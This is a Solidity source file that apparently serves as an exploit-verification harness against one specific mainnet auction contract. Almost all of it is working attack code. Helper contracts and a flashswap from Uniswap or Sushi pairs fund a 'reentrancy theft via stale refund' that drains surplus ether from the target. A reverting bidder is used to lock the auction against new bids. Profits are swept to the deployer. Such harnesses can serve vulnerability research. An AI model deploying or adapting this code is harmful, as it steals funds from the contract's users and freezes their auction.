// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IGameAuction {
    function isAuction() external view returns (bool);
    function isAuctionEnd() external view returns (bool);
    function isGameEnd() external view returns (bool);
    function bidAddress() external view returns (address);
    function bidEther() external view returns (uint256);
    function newBidEtherMin() external view returns (uint256);
    function makeBid() external payable;
}

interface IUniV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IWETHLike {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function transfer(address to, uint256 value) external returns (bool);
}

contract SimpleBidder {
    IGameAuction internal immutable game;
    address internal immutable verifier;

    modifier onlyVerifier() {
        require(msg.sender == verifier, "only verifier");
        _;
    }

    constructor(IGameAuction game_, address verifier_) payable {
        game = game_;
        verifier = verifier_;
    }

    receive() external payable {}

    function bid(uint256 amount) external payable onlyVerifier {
        require(msg.value == amount, "bad value");
        game.makeBid{value: amount}();
    }

    function attemptBid(uint256 amount) external payable onlyVerifier returns (bool success, bytes memory data) {
        require(msg.value == amount, "bad value");
        (success, data) = address(game).call{value: amount}(abi.encodeWithSelector(IGameAuction.makeBid.selector));
    }

    function sweep() external onlyVerifier {
        (bool sent, ) = payable(verifier).call{value: address(this).balance}("");
        require(sent, "sweep failed");
    }
}

contract ReentrantBidder {
    IGameAuction internal immutable game;
    address internal immutable verifier;
    uint256 internal reentryBidAmount;
    uint256 internal reentriesRemaining;
    bool internal armed;

    modifier onlyVerifier() {
        require(msg.sender == verifier, "only verifier");
        _;
    }

    constructor(IGameAuction game_, address verifier_) payable {
        game = game_;
        verifier = verifier_;
    }

    receive() external payable {
        if (
            msg.sender == address(game) &&
            armed &&
            reentriesRemaining != 0 &&
            address(this).balance >= reentryBidAmount
        ) {
            unchecked {
                --reentriesRemaining;
            }
            game.makeBid{value: reentryBidAmount}();
        }
    }

    function configureReentry(uint256 reentryBidAmount_, uint256 reentriesRemaining_, bool armed_) external onlyVerifier {
        reentryBidAmount = reentryBidAmount_;
        reentriesRemaining = reentriesRemaining_;
        armed = armed_;
    }

    function bid(uint256 amount) external payable onlyVerifier {
        require(msg.value == amount, "bad value");
        game.makeBid{value: amount}();
    }

    function sweep() external onlyVerifier {
        (bool sent, ) = payable(verifier).call{value: address(this).balance}("");
        require(sent, "sweep failed");
    }
}

contract RevertingBidder {
    IGameAuction internal immutable game;
    address internal immutable verifier;

    modifier onlyVerifier() {
        require(msg.sender == verifier, "only verifier");
        _;
    }

    constructor(IGameAuction game_, address verifier_) payable {
        game = game_;
        verifier = verifier_;
    }

    receive() external payable {
        revert("refund blocked");
    }

    function bid(uint256 amount) external payable onlyVerifier {
        require(msg.value == amount, "bad value");
        game.makeBid{value: amount}();
    }
}

contract FlawVerifier {
    IGameAuction public constant TARGET =
        IGameAuction(0x52d69c67536f55EfEfe02941868e5e762538dBD6);

    uint256 internal constant MIN_REQUIRED_PROFIT = 1e15;

    address internal constant MAINNET_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant MAINNET_USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant MAINNET_USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant MAINNET_DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant MAINNET_UNIV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant MAINNET_SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    ReentrantBidder internal immutable reentrantBidder;
    RevertingBidder internal immutable revertingBidder;
    SimpleBidder internal immutable helperBidder;

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public originalHypothesisValidated;
    bool public originalHypothesisRefuted;
    bool public profitAchieved;
    bool public reentrancyPathExecuted;
    bool public reentrancyPathProfitable;
    bool public lockupPathExecuted;
    string public exploitPathUsed;

    struct ProfitPlan {
        uint256 attackBid;
        uint256 reentryBid;
        uint256 victimBid;
        uint256 reentryCount;
        uint256 loanAmount;
        uint256 expectedNetProfit;
        bool viable;
    }

    struct CallbackPlan {
        uint256 baselineBalance;
        uint256 attackBid;
        uint256 reentryBid;
        uint256 victimBid;
        uint256 reentryCount;
        uint256 loanAmount;
    }

    address internal _callbackPair;
    address internal _callbackWeth;
    CallbackPlan internal _callbackPlan;

    constructor() payable {
        reentrantBidder = new ReentrantBidder(TARGET, address(this));
        revertingBidder = new RevertingBidder(TARGET, address(this));
        helperBidder = new SimpleBidder(TARGET, address(this));
        _profitToken = address(0);
    }

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external payable {
        uint256 baselineBalance = address(this).balance - msg.value;

        if (TARGET.isAuctionEnd()) {
            originalHypothesisRefuted = true;
            return;
        }

        bool profitableReentrancy = false;
        if (address(this).balance >= TARGET.newBidEtherMin() + 1) {
            profitableReentrancy = _attemptDirectProfitPath(baselineBalance);
        } else {
            profitableReentrancy = _attemptFlashswapProfitPath(baselineBalance);
        }

        if (!lockupPathExecuted) {
            uint256 spareProfit = address(this).balance > baselineBalance ? address(this).balance - baselineBalance : 0;
            if (!profitableReentrancy || spareProfit > MIN_REQUIRED_PROFIT + (TARGET.newBidEtherMin() * 2)) {
                _attemptLockupPath();
            }
        }

        _finalize(baselineBalance);

        if (!profitAchieved && !originalHypothesisValidated) {
            originalHypothesisRefuted = true;
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleV2Callback(sender, amount0, amount1);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleV2Callback(sender, amount0, amount1);
    }

    function sushiCall(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleV2Callback(sender, amount0, amount1);
    }

    function _handleV2Callback(address sender, uint256 amount0, uint256 amount1) internal {
        require(msg.sender == _callbackPair, "bad pair");
        require(sender == address(this), "bad sender");

        uint256 borrowedWeth = amount0 != 0 ? amount0 : amount1;
        CallbackPlan memory plan = _callbackPlan;
        require(borrowedWeth == plan.loanAmount, "bad loan");

        IWETHLike(_callbackWeth).withdraw(borrowedWeth);

        // The flashswap only supplies transient public liquidity so the verifier
        // can realistically fund the incumbent bid and the later challenger bid.
        // The exploit itself remains the same stale-refund reentrancy.
        bool reentrancyOk = _executeReentrancyPath(plan.attackBid, plan.reentryBid, plan.victimBid, plan.reentryCount);
        require(reentrancyOk, "reentrancy path failed");

        uint256 repayAmount = _flashRepayAmount(plan.loanAmount);
        require(address(this).balance >= repayAmount, "insufficient repay");

        IWETHLike(_callbackWeth).deposit{value: repayAmount}();
        bool sent = IWETHLike(_callbackWeth).transfer(_callbackPair, repayAmount);
        require(sent, "repay transfer failed");
    }

    function _attemptFlashswapProfitPath(uint256 baselineBalance) internal returns (bool) {
        ProfitPlan memory plan = _buildProfitPlan();
        if (!plan.viable) {
            return false;
        }

        (address pair, address weth, uint256 amount0Out, uint256 amount1Out) = _findFlashPair(plan.loanAmount);
        if (pair == address(0)) {
            return false;
        }

        _callbackPair = pair;
        _callbackWeth = weth;
        _callbackPlan = CallbackPlan({
            baselineBalance: baselineBalance,
            attackBid: plan.attackBid,
            reentryBid: plan.reentryBid,
            victimBid: plan.victimBid,
            reentryCount: plan.reentryCount,
            loanAmount: plan.loanAmount
        });

        (bool success, ) = pair.call(
            abi.encodeWithSelector(
                IUniV2Pair.swap.selector,
                amount0Out,
                amount1Out,
                address(this),
                hex"01"
            )
        );

        delete _callbackPlan;
        _callbackPair = address(0);
        _callbackWeth = address(0);

        if (success && address(this).balance > baselineBalance) {
            reentrancyPathProfitable = true;
            if (bytes(exploitPathUsed).length == 0) {
                exploitPathUsed = "reentrancy theft via stale refund";
            }
            return true;
        }

        return false;
    }

    function _attemptDirectProfitPath(uint256 baselineBalance) internal returns (bool) {
        ProfitPlan memory plan = _buildProfitPlan();
        if (!plan.viable || address(this).balance < plan.attackBid + plan.victimBid) {
            return false;
        }

        bool success = _executeReentrancyPath(plan.attackBid, plan.reentryBid, plan.victimBid, plan.reentryCount);
        if (!success) {
            return false;
        }

        if (address(this).balance > baselineBalance) {
            reentrancyPathProfitable = true;
            if (bytes(exploitPathUsed).length == 0) {
                exploitPathUsed = "reentrancy theft via stale refund";
            }
            return true;
        }

        return false;
    }

    function _executeReentrancyPath(
        uint256 attackBid,
        uint256 reentryBid,
        uint256 victimBid,
        uint256 reentryCount
    ) internal returns (bool) {
        address incumbentBefore = TARGET.bidAddress();

        (bool initialBidOk, ) = address(reentrantBidder).call{value: attackBid}(
            abi.encodeWithSelector(ReentrantBidder.bid.selector, attackBid)
        );

        if (!initialBidOk) {
            if (TARGET.bidAddress() == incumbentBefore) {
                originalHypothesisValidated = true;
                lockupPathExecuted = true;
                exploitPathUsed = "existing incumbent already blocks refunds";
            }
            return false;
        }

        reentrantBidder.configureReentry(reentryBid, reentryCount, true);

        (bool victimBidOk, ) = address(helperBidder).call{value: victimBid}(
            abi.encodeWithSelector(SimpleBidder.bid.selector, victimBid)
        );

        reentrantBidder.configureReentry(0, 0, false);
        reentrantBidder.sweep();
        helperBidder.sweep();

        if (!victimBidOk) {
            return false;
        }

        reentrancyPathExecuted = true;
        originalHypothesisValidated = true;
        if (bytes(exploitPathUsed).length == 0) {
            exploitPathUsed = "reentrancy theft via stale refund";
        }
        return true;
    }

    function _attemptLockupPath() internal returns (bool) {
        uint256 lockBid = TARGET.newBidEtherMin() + 1;
        if (address(this).balance < lockBid) {
            return false;
        }

        address incumbentBefore = TARGET.bidAddress();

        (bool lockBidOk, ) = address(revertingBidder).call{value: lockBid}(
            abi.encodeWithSelector(RevertingBidder.bid.selector, lockBid)
        );

        if (!lockBidOk) {
            if (TARGET.bidAddress() == incumbentBefore) {
                originalHypothesisValidated = true;
                lockupPathExecuted = true;
                exploitPathUsed = "existing incumbent already blocks refunds";
                return true;
            }
            return false;
        }

        uint256 challengerBid = _nextBid(lockBid);
        if (address(this).balance < challengerBid) {
            return false;
        }

        (bool challengerOk, ) = helperBidder.attemptBid{value: challengerBid}(challengerBid);
        helperBidder.sweep();

        if (!challengerOk) {
            lockupPathExecuted = true;
            originalHypothesisValidated = true;
            if (bytes(exploitPathUsed).length == 0) {
                exploitPathUsed = "auction lockup via reverting refund";
            }
            return true;
        }

        return false;
    }

    function _buildProfitPlan() internal view returns (ProfitPlan memory best) {
        uint256 currentBid = TARGET.bidEther();
        uint256 attackBid = TARGET.newBidEtherMin() + 1;
        uint256 reentryBid = _nextBid(attackBid);
        uint256 targetBalance = address(TARGET).balance;

        if (attackBid <= reentryBid || targetBalance <= currentBid) {
            return best;
        }

        uint256 surplus = targetBalance - currentBid;
        uint256 delta = attackBid - reentryBid;

        for (uint256 reentryCount = 1; reentryCount <= 64; ++reentryCount) {
            uint256 drain = reentryCount * delta;
            uint256 victimBid = reentryBid;
            if (drain > surplus + victimBid) {
                victimBid = drain - surplus;
            }

            uint256 loanAmount = attackBid + victimBid;
            uint256 expectedNetProfit = drain > victimBid ? drain - victimBid : 0;
            uint256 repayFee = _flashFee(loanAmount);

            if (expectedNetProfit > repayFee + MIN_REQUIRED_PROFIT && expectedNetProfit - repayFee > best.expectedNetProfit) {
                best = ProfitPlan({
                    attackBid: attackBid,
                    reentryBid: reentryBid,
                    victimBid: victimBid,
                    reentryCount: reentryCount,
                    loanAmount: loanAmount,
                    expectedNetProfit: expectedNetProfit - repayFee,
                    viable: true
                });
            }
        }
    }

    function _findFlashPair(
        uint256 loanAmount
    ) internal view returns (address pair, address weth, uint256 amount0Out, uint256 amount1Out) {
        address[6] memory factories = [
            MAINNET_UNIV2_FACTORY,
            MAINNET_UNIV2_FACTORY,
            MAINNET_UNIV2_FACTORY,
            MAINNET_SUSHI_FACTORY,
            MAINNET_SUSHI_FACTORY,
            MAINNET_SUSHI_FACTORY
        ];
        address[6] memory counters = [
            MAINNET_USDC,
            MAINNET_USDT,
            MAINNET_DAI,
            MAINNET_USDC,
            MAINNET_USDT,
            MAINNET_DAI
        ];

        weth = MAINNET_WETH;

        for (uint256 i = 0; i < factories.length; ++i) {
            address candidatePair = IUniV2Factory(factories[i]).getPair(weth, counters[i]);
            if (candidatePair == address(0)) {
                continue;
            }

            (uint112 reserve0, uint112 reserve1, ) = IUniV2Pair(candidatePair).getReserves();
            address token0 = IUniV2Pair(candidatePair).token0();
            uint256 wethReserve = token0 == weth ? uint256(reserve0) : uint256(reserve1);
            if (wethReserve <= loanAmount + _flashFee(loanAmount)) {
                continue;
            }

            pair = candidatePair;
            if (token0 == weth) {
                amount0Out = loanAmount;
            } else {
                amount1Out = loanAmount;
            }
            return (pair, weth, amount0Out, amount1Out);
        }
    }

    function _finalize(uint256 baselineBalance) internal {
        if (address(this).balance > baselineBalance) {
            unchecked {
                _profitAmount = address(this).balance - baselineBalance;
            }
            profitAchieved = true;
            if (bytes(exploitPathUsed).length == 0) {
                exploitPathUsed = "direct profit";
            }
        } else {
            _profitAmount = 0;
        }
    }

    function _nextBid(uint256 currentBid) internal pure returns (uint256) {
        return ((currentBid * 5) / 100) + 1;
    }

    function _flashFee(uint256 amount) internal pure returns (uint256) {
        return ((amount * 3) / 997) + 1;
    }

    function _flashRepayAmount(uint256 amount) internal pure returns (uint256) {
        return amount + _flashFee(amount);
    }
}
